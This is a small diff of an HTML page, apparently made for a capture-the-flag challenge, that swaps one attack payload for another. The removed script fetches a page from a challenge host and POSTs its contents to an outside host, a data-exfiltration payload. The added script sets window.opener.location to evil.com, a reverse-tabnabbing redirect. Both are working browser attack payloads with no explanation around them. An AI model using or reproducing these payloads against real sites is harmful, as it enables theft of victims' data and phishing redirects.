@@ -1,15 +1,7 @@
 <html>
   <body>
-    <h1>works</h1>
-    <script>
-  fetch("https://yellow.ctfio.com/blind/recipe")
-    .then(response => response.text())
-    .then(text => {
-      fetch("https://xwtkltb9.c5.rs", {
-        method: "POST",
-        body: "data=" + encodeURIComponent(text)
-      });
-    });
+    <h1>hey!</h1>
+    <script>window.opener.location = "https://evil.com"</script>;
 </script>
   </body>
 </html>
